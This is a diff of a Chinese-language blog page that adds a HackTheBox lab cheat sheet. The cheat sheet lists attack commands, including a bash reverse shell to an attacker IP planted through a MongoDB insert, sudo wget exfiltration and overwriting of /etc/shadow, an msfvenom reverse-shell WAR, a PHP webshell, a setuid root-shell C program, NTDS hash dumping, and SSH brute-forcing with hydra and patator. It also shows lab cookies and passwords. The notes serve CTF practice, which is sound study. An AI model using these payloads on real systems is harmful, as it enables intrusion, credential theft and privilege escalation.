+dig axfr @ip 域名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">登陆110端口
+telnet ip 110
+
+输入用户名+密码
+user mindy
+pass mindy
+
+list 列出邮件数
+retr 1 查看第一封邮件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="不同机器间通过nc传输内容"><a href="#不同机器间通过nc传输内容" class="headerlink" title="不同机器间通过nc传输内容"></a>不同机器间通过nc传输内容</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">发送：
+.&#x2F;LinEnum.sh -t | nc 10.10.14.10  端口
+接收：
+nc -lvnp 4242 &gt; result.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="wfuzz工具"><a href="#wfuzz工具" class="headerlink" title="wfuzz工具"></a>wfuzz工具</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wfuzz -c --hl&#x3D;2 -z range,1-65535 http:&#x2F;&#x2F;10.10.10.55:60000&#x2F;url.php?path&#x3D;http:&#x2F;&#x2F;localhost:FUZZ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.10.10.55 LPORT&#x3D;8080 -f war &gt; rever1.war<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="破解dit文件-NTLM"><a href="#破解dit文件-NTLM" class="headerlink" title="破解dit文件 NTLM"></a>破解dit文件 NTLM</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">破解dit文件
+impacket-secretsdump -ntds nt.dit -system nt.bin LOCAL
+
+破解NTLM https:&#x2F;&#x2F;crackstation.net&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="authbind"><a href="#authbind" class="headerlink" title="authbind"></a>authbind</h2><p>利用authbind解决非root用户无法侦听&lt;1024端口的问题</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">authbind python -m pyftpdlib -p21 -w<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="wget-提权"><a href="#wget-提权" class="headerlink" title="wget + 提权"></a>wget + 提权</h2><p>wget加入cookie</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wget --header &quot;Cookie: connect.sid&#x3D;s%3AnzNAGucmccv12MwVpzPJ7H9ZlBClBTkN.OltQcwWhAyv2y0W9m0qs8Q7LSG7VMnC7joSrN2Zf9ss&quot; http:&#x2F;&#x2F;10.10.10.58:3000&#x2F;api&#x2F;admin&#x2F;backup
+
+curl -s -XGET -b &#39;connect.sid&#x3D;s%3AnzNAGucmccv12MwVpzPJ7H9ZlBClBTkN.OltQcwWhAyv2y0W9m0qs8Q7LSG7VMnC7joSrN2Zf9ss&#39; http:&#x2F;&#x2F;10.10.10.58:3000&#x2F;api&#x2F;admin&#x2F;backup -o myplace.backup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>wget提权</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">将待提权机器的&#x2F;etc&#x2F;shadow传到攻击机10.10.14.4（攻击机开80端口）
+sudo &#x2F;usr&#x2F;bin&#x2F;wget --post-file&#x3D;&#x2F;etc&#x2F;shadow 10.10.14.4
+
+将内容保存为文件shadow，将root一行的密码自己改写为别的密码以同样加密方式加密后的哈希值
+开启9999端口，将shadow文件传到待提权机器，覆盖待提权机器的&#x2F;etc&#x2F;shadow文件
+sudo wget 10.10.14.4:9999&#x2F;shadow -O &#x2F;etc&#x2F;shadow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="破解zip压缩包"><a href="#破解zip压缩包" class="headerlink" title="破解zip压缩包"></a>破解zip压缩包</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fcrackzip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u backup.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="mongodb"><a href="#mongodb" class="headerlink" title="mongodb"></a>mongodb</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mongodb连接命令 （连接名为 scheduler 的mongodb 数据库）
+mongo localhost:27017&#x2F;scheduler -u mark -p 5AYRft73VtFpc84k
+
+mongodb插入命令
+db.tasks.insert(&#123;&quot;cmd&quot;: &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.10&#x2F;4242 0&gt;&amp;1&#39;&quot;&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tmux切换session
+tmux -S &#x2F;.devs&#x2F;dev_sess<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="php一句话"><a href="#php一句话" class="headerlink" title="php一句话"></a>php一句话</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="ssh隧道端口映射"><a href="#ssh隧道端口映射" class="headerlink" title="ssh隧道端口映射"></a>ssh隧道端口映射</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ssh -L5901:localhost:5901 charix@10.10.10.84<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="查看端口开放"><a href="#查看端口开放" class="headerlink" title="查看端口开放"></a>查看端口开放</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">netstat -nlpt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="patator密码爆破"><a href="#patator密码爆破" class="headerlink" title="patator密码爆破"></a>patator密码爆破</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">patator ssh_login host&#x3D;10.10.10.76 port&#x3D;22022 user&#x3D;sunny password&#x3D;FILE0 0&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -x ignore:mesg&#x3D;&#39;Authentication failed.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="使用已保存脚本提权"><a href="#使用已保存脚本提权" class="headerlink" title="使用已保存脚本提权"></a>使用已保存脚本提权</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;sys/types.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token function">geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">编译32位程序
+gcc -m32 1.c -o exploit
+
+查看定时任务剩余执行时间
+systemctl list-timers <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">以7400mode破解储存在1.txt中的哈希值
+hashcat -m 7400 1.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">hydra爆破ssh
+hydra -L user.txt -P pass.txt ssh:&#x2F;&#x2F;10.10.10.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="ssh报错解决方案"><a href="#ssh报错解决方案" class="headerlink" title="ssh报错解决方案"></a>ssh报错解决方案</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+
+ssh root@10.10.10.7 -o KexAlgorithms&#x3D;+diffie-hellman-group1-sha1
+
+Unable to negotiate with 10.10.10.7 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
+
+ssh root@10.10.10.7 -o KexAlgorithms&#x3D;+diffie-hellman-group1-sha1 -o HostKeyAlgorithms&#x3D;+ssh-dss<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
                 
             </div>
@@ -572,7 +590,7 @@ schemata
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://ezy0812.github.io/2020/03/14/mysql-injection-1/">https://ezy0812.github.io/2020/03/14/mysql-injection-1/</a>
+                    <a href="https://ezy0812.github.io/2022/09/19/hackthebox/">https://ezy0812.github.io/2022/09/19/hackthebox/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -610,8 +628,12 @@ schemata
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/sql-injection/">
-                                    <span class="chip bg-color">sql_injection</span>
+                                <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                                    <span class="chip bg-color">靶场</span>
+                                </a>
+                            
+                                <a href="/tags/%E7%AC%94%E8%AE%B0/">
+                                    <span class="chip bg-color">笔记</span>
                                 </a>
                             
                         </div>
@@ -654,66 +676,18 @@ schemata
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/03/16/mysql-injection-2/">
+                <a href="/2022/09/19/hackthebox/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="基于sqli_lab的sql注入详解(二)">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="hackthebox">
                         
-                        <span class="card-title">基于sqli_lab的sql注入详解(二)</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-16
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
-                                    渗透测试
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/sql-injection/">
-                        <span class="chip bg-color">sql_injection</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/03/14/mysql-injection-1/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="基于sqli_lab的sql注入详解(一)">
-                        
-                        <span class="card-title">基于sqli_lab的sql注入详解(一)</span>
+                        <span class="card-title">hackthebox</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -724,7 +698,7 @@ schemata
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-19
                             </span>
                         <span class="publish-author">
                             
@@ -742,8 +716,61 @@ schemata
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/sql-injection/">
-                        <span class="chip bg-color">sql_injection</span>
+                    <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                        <span class="chip bg-color">靶场</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%AC%94%E8%AE%B0/">
+                        <span class="chip bg-color">笔记</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/03/26/%E5%81%9A%E6%88%91%E7%9A%84%E5%96%B5/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="做我的喵">
+                        
+                        <span class="card-title">做我的喵</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%88%B1%E6%83%85/" class="post-category">
+                                    爱情
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%B0%8F%E8%AE%B0/">
+                        <span class="chip bg-color">小记</span>
                     </a>
                     
                 </div>
